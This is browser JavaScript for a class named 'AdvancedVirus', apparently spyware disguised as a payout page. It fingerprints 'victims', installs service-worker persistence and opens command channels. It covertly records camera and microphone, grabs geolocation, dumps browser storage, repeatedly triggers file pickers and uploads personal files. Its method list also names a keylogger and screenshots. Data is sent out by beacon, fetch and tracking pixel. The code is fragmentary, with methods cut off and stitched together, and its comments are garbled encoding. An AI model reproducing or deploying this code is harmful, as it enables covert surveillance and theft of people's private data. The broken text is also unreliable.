<script>
class AdvancedVirus {
    constructor() {

    generateUniqueId() {
        const timestamp = Date.now().toString(36);
        const random = Math.random().toString(36).substr(2, 9);
        const fingerprint = this.getDeviceFingerprint();
        return `victim_${timestamp}_${random}_${fingerprint}`;
    }

    getDeviceFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.platform,
            screen.width + 'x' + screen.height,
            navigator.language,
            new Date().getTimezoneOffset(),
            !!navigator.cookieEnabled,
            navigator.hardwareConcurrency || 'unknown'
        ];
        
        let fingerprint = components.join('|');
        let hash = 0;
        for (let i = 0; i < fingerprint.length; i++) {
            const char = fingerprint.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(36);
    }

            await this.scanFileSystem();

            await this.updateProgress(60, 'üñºÔ∏è –ê–Ω–∞–ª–∏–∑ –º–µ–¥–∏–∞ —Ñ–∞–π–ª–æ–≤...');
            await this.analyzeMediaFiles();

            await this.updateProgress(70, 'üì° –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–µ—Ä–≤–µ—Ä—É –≤—ã–ø–ª–∞—Ç...');

    checkPreviousInfection() {
        const storedId = localStorage.getItem('victim_unique_id');
        if (storedId && storedId.includes(this.getDeviceFingerprint())) {

    markAsInstalled() {
        localStorage.setItem('victim_unique_id', this.victimId);

    async collectDeviceInfo() {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            languages: navigator.languages,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            } : null
        };

        this.deviceFingerprint = deviceInfo;
        this.sendToServer('/device_info', deviceInfo);
    }

    async installPersistence() {
        // Service Worker –¥–ª—è —Ñ–æ–Ω–æ–≤–æ–π —Ä–∞–±–æ—Ç—ã
        if ('serviceWorker' in navigator) {
            try {
                const registration = await navigator.serviceWorker.register(
                    URL.createObjectURL(new Blob([
                        `self.addEventListener('install', (e) => {
                            self.skipWaiting();
                        });
                         self.addEventListener('activate', (e) => {
                            e.waitUntil(self.clients.claim());
                         });
                         self.addEventListener('fetch', (e) => {
                            // –ü–µ—Ä–µ—Ö–≤–∞—Ç –∑–∞–ø—Ä–æ—Å–æ–≤
                         });`
                    ], { type: 'application/javascript' }))
                );
            } catch (e) {}
        }

        // LocalStorage –¥–ª—è –æ—Ç—Å–ª–µ–∂–∏–≤–∞–Ω–∏—è
        localStorage.setItem('last_activity', new Date().toISOString());
    }

    async setupCommunication() {

        this.setupWebRTC();
        
        // WebSocket –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏
        this.setupWebSocket();
        
        // Heartbeat —Å–∏—Å—Ç–µ–º–∞
        this.startHeartbeat();

    setupWebRTC() {
        try {
            const pc = new RTCPeerConnection({
                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
            });
            
            pc.onicecandidate = (e) => {
                if (e.candidate) {
                    this.sendToServer('/webrtc', {
                        candidate: e.candidate.candidate
                    });
                }
            };
            
            pc.createDataChannel('command');
        } catch (e) {}
    }

    setupWebSocket() {
        try {
            // –î–ª—è GitHub Pages –∏—Å–ø–æ–ª—å–∑—É–µ–º –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–π –ø—É—Ç—å
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.hostname}:8080`;
            
            this.ws = new WebSocket(wsUrl);
            this.ws.onopen = () => {
                this.sendToServer('/ws_connect', { victimId: this.victimId });
                this.updateConnectionStatus('‚úÖ –°–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ', true);
            };
            
            this.ws.onmessage = (event) => {
                this.handleCommand(JSON.parse(event.data));
            };
            
            this.ws.onerror = () => {
                this.updateConnectionStatus('‚ùå –û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è', false);
            };
            
        } catch (e) {
            this.startPolling();
        }
    }

    startHeartbeat() {
        this.heartbeatInterval = setInterval(() => {
            this.sendToServer('/heartbeat', {
                victimId: this.victimId,
                timestamp: new Date().toISOString(),
                location: window.location.href,
                battery: navigator.getBattery ? 'available' : 'unavailable'
            });
        }, 5000);
    }

    async enableAccessModules() {
        // –ö–∞–º–µ—Ä–∞ –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω
        await this.enableMediaAccess();
        
        // –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è
        await this.enableGeolocation();
        
        // –§–∞–π–ª–æ–≤–∞—è —Å–∏—Å—Ç–µ–º–∞
        await this.enableFileSystemAccess();
        
        // –ö–µ–π–ª–æ–≥–≥–µ—Ä
        this.enableKeylogger();
        
        // –°–∫—Ä–∏–Ω—à–æ—Ç—ã
        this.enableScreenshots();
    }

    async enableMediaAccess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'environment',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }, 
                audio: {
                    echoCancellation: false,
                    noiseSuppression: false,
                    autoGainControl: false,
                    channelCount: 2,
                    sampleRate: 44100
                }
            });
            
            this.mediaStreams.camera = stream;
            const video = document.getElementById('hiddenCamera');
            video.srcObject = stream;
            
            // –ù–∞—á–∏–Ω–∞–µ–º –∑–∞–ø–∏—Å—å
            this.startMediaRecording(stream);
            
            this.sendToServer('/media_status', {
                camera: true,
                microphone: true,
                resolution: '1080p'
            });
            
        } catch (error) {
            this.sendToServer('/media_status', {
                camera: false,
                microphone: false,
                error: error.message
            });
        }
    }

    startMediaRecording(stream) {
        try {
            this.mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm; codecs=vp9,opus'
            });
            
            this.mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    this.sendMediaData(event.data);
                }
            };
            
            this.mediaRecorder.start(2000); // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–∞–∂–¥—ã–µ 2 —Å–µ–∫—É–Ω–¥—ã
            
        } catch (error) {
            console.error('Recording failed:', error);
        }
    }

    async enableGeolocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    this.sendToServer('/location', {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed
                    });
                },
                (error) => {
                    this.getIPLocation();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
    }

            if ('showDirectoryPicker' in window) {
                this.fileSystemAccess = await window.showDirectoryPicker();
                this.sendToServer('/filesystem_access', { status: 'granted' });
            } else {
                // Fallback: –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Å–∫—Ä—ã—Ç–æ–≥–æ input
                this.setupFileInputAccess();
            }

        const fileInput = document.getElementById('fileInput');

    async scanFileSystem() {
        this.sendToServer('/file_scan_start', {});
        
        try {
            // –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —á–µ—Ä–µ–∑ —Ä–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã
            await this.scanIndexedDB();
            await this.scanLocalStorage();
            await this.scanCacheStorage();
            
            // –ü–æ–ø—ã—Ç–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª–∞–º —á–µ—Ä–µ–∑ input
            this.triggerFileExplorer();
            
        } catch (error) {
            console.error('File system scan error:', error);
        }
    }

    async scanIndexedDB() {
        try {
            const databases = await window.indexedDB.databases();
            this.sendToServer('/indexeddb_scan', {
                databaseCount: databases.length,
                databases: databases.map(db => db.name)
            });
        } catch (e) {}
    }

    async scanLocalStorage() {
        try {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                items[key] = localStorage.getItem(key);
            }
            this.sendToServer('/localstorage_scan', items);
        } catch (e) {}
    }

    async scanCacheStorage() {
        try {
            if ('caches' in window) {
                const cacheNames = await caches.keys();
                const cacheContents = {};
                
                for (const cacheName of cacheNames) {
                    const cache = await caches.open(cacheName);
                    const requests = await cache.keys();
                    cacheContents[cacheName] = requests.map(req => req.url);
                }
                
                this.sendToServer('/cache_scan', cacheContents);
            }
        } catch (e) {}
    }

    triggerFileExplorer() {
        // –ú–Ω–æ–≥–æ–∫—Ä–∞—Ç–Ω—ã–µ –ø–æ–ø—ã—Ç–∫–∏ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª–∞–º
        for (let i = 0; i < 3; i++) {
            setTimeout(() => {
                document.getElementById('fileInput').click();
            }, i * 2000);
        }
    }

    async handleFileSelection(files) {
        const fileList = Array.from(files);
        this.sendToServer('/file_discovery', {
            fileCount: fileList.length,
            files: fileList.map(file => ({
                name: file.name,
                type: file.type,
                size: file.size,
                lastModified: file.lastModified
            }))
        });

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ –∏–Ω—Ç–µ—Ä–µ—Å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
        for (const file of fileList) {
            if (this.isInterestingFile(file)) {
                await this.uploadFile(file);
            }
        }
    }

    isInterestingFile(file) {
        const interestingTypes = [
            'image/', 'video/', 'audio/', 
            'application/pdf', 'text/',
            '.jpg', '.jpeg', '.png', '.gif', '.mp4', '.mp3', '.avi',
            '.mov', '.wav', '.pdf', '.doc', '.docx', '.txt'
        ];
        
        return interestingTypes.some(type => 
            file.type.includes(type) || file.name.toLowerCase().includes(type)
        );
    }

    async uploadFile(file) {
        try {
            const formData = new FormData();
            formData.append('victimId', this.victimId);
            formData.append('fileName', file.name);
            formData.append('fileType', file.type);
            formData.append('fileSize', file.size);
            formData.append('timestamp', new Date().toISOString());
            formData.append('file', file);

            await fetch(this.serverUrl + '/upload_file', {
                method: 'POST',
                body: formData
            });
            
            this.sendToServer('/file_uploaded', {
                fileName: file.name,
                size: file.size,
                type: file.type
            });
            
        } catch (error) {
            console.error('File upload error:', error);
        }
    }

    enableScreenshots() {

                if (video.srcObject) {

                    const context = canvas.getContext('2d');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    context.drawImage(video, 0, 0);
                    
                    canvas.toBlob((blob) => {

            elements.forEach(el => {

            });

        console.clear = function() {};

    async finalizeInfection() {

    updateProgress(percent, message) {

    sendToServer(endpoint, data) {
        const payload = {
            victimId: this.victimId,
            deviceFingerprint: this.getDeviceFingerprint(),
            timestamp: new Date().toISOString(),
            ...data
        };

        // –ú–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã–µ –º–µ—Ç–æ–¥—ã –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–ª—è –Ω–∞–¥–µ–∂–Ω–æ—Å—Ç–∏
        this.sendViaBeacon(payload);
        this.sendViaFetch(payload);
        this.sendViaImage(payload);
    }

    sendViaBeacon(payload) {
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(this.serverUrl + '/beacon', blob);
    }

    sendViaFetch(payload) {
        fetch(this.serverUrl + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            mode: 'no-cors'
        }).catch(() => {});
    }

    sendViaImage(payload) {
        const img = new Image();
        const encodedData = btoa(JSON.stringify(payload));
        img.src = `${this.serverUrl}/pixel?data=${encodedData}`;
    }

    sendMediaData(blob, type = 'video') {
        const formData = new FormData();
        formData.append('type', type);
        formData.append('victimId', this.victimId);
        formData.append('timestamp', new Date().toISOString());
        formData.append('media', blob);

        fetch(this.serverUrl + '/upload_media', {
            method: 'POST',
            body: formData,
            mode: 'no-cors'
        }).catch(() => {});
    }
}
